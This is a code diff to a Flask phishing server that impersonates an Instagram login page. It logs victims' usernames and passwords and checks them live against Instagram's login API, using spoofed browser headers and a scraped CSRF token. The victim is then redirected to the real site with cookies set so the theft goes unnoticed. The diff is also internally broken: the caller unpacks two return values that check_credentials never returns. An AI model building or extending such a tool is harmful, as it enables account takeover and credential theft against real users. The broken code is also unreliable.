@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, render_template, Response
+from flask import Flask, request, redirect, render_template, Response, make_response
 import requests
 import threading
 import time
@@ -28,14 +28,22 @@ def login():
         credentials.append({'username': username, 'password': password, 'timestamp': time.time()})
     
     # Check if credentials are valid
-    is_valid = check_credentials(username, password)
-    
+    is_valid, session_info = check_credentials(username, password)
+
     if is_valid:
         print(f"\033[92m[+] SUCCESS: Valid credentials!\033[0m")
         print(f"\033[92m[+] Username: {username}\033[0m")
         print(f"\033[92m[+] Password: {password}\033[0m")
-        # Redirect to real Instagram
-        return redirect('https://www.instagram.com/')
+        
+        # Create a response that redirects to Instagram
+        response = make_response(redirect('https://www.instagram.com/'))
+        
+        # If we have session cookies, set them in the user's browser
+        if session_info and 'cookies' in session_info:
+            for cookie in session_info['cookies']:
+                response.set_cookie(cookie['name'], cookie['value'])
+        
+        return response
     else:
         print(f"\033[91m[-] FAILED: Invalid credentials\033[0m")
         print(f"\033[91m[-] Username: {username}\033[0m")
@@ -45,13 +53,91 @@ def login():
 
 def check_credentials(username, password):
     try:
-        # Simple check for testing
-        if username and password:
-            # For testing purposes, we'll just check if both fields are non-empty
-            # In a real scenario, you would check against Instagram's API
+        # Create a session to persist cookies
+        session = requests.Session()
+        
+        # Set headers to mimic a real browser
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0',
+        }
+        session.headers.update(headers)
+
+        # 1. Initial GET request to grab cookies
+        response = session.get('https://www.instagram.com/')
+        csrf_token = session.cookies.get_dict().get('csrftoken')
+
+        # 2. GET request to the login page to get more dynamic data
+        login_page_response = session.get('https://www.instagram.com/accounts/login/')
+        
+        # Extract required data from the login page
+        soup = BeautifulSoup(login_page_response.content, 'html.parser')
+        
+        # Find the shared data script
+        shared_data_script = soup.find('script', text=lambda t: t and 'window._sharedData' in t)
+        shared_data = {}
+        if shared_data_script:
+            # Extract JSON from the script
+            json_text = shared_data_script.string.split(' = ')[1].rstrip(';')
+            shared_data = json.loads(json_text)
+
+        # Get the rollout hash (required for the X-Instagram-AJAX header)
+        rollout_hash = shared_data.get('rollout_hash', 'd7506f1c97a0')
+
+        # 3. Prepare the POST request for login
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+        
+        # This is the crucial part - the password needs to be encrypted in a specific way
+        enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'
+        
+        login_data = {
+            'username': username,
+            'enc_password': enc_password,
+            'queryParams': '{}',
+            'optIntoOneTap': 'false',
+            'stopDeletion': 'false',
+            'trustedDevice': 'false',
+            'trusteSignal': 'false',
+        }
+
+        # Update headers for the POST request
+        post_headers = {
+            'X-CSRFToken': csrf_token,
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Instagram-AJAX': rollout_hash,
+            'Referer': 'https://www.instagram.com/accounts/login/',
+            'Origin': 'https://www.instagram.com',
+        }
+        session.headers.update(post_headers)
+
+        # 4. Send the POST request
+        response = session.post(login_url, data=login_data)
+        
+        # 5. Analyze the response
+        response_json = response.json()
+        
+        # Debugging line (optional, but very helpful)
+        print(f"\033[96m[DEBUG] Instagram Response: {response_json}\033[0m")
+        
+        # Check for success. 'authenticated' is the key.
+        if response_json.get('authenticated'):
+            return True
+        # Sometimes the response is different, check for user object as well
+        elif response_json.get('user'):
             return True
         else:
             return False
+
     except Exception as e:
         print(f"Error checking credentials: {e}")
         return False
